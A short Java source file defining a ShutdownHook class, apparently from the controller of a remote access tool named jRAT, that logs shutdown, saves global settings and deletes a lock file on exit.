package jrat.controller;

import jrat.common.Logger;
import jrat.controller.settings.AbstractStorable;
import jrat.controller.settings.Settings;

public class ShutdownHook implements Runnable {

	@Override
	public void run() {
		Logger.log("Shutting down...");

		AbstractStorable.saveAllGlobals();

		try {
			Settings.getGlobal().save();
		} catch (Exception e) {
			e.printStackTrace();
		}

		Globals.getLockFile().delete();
	}

}
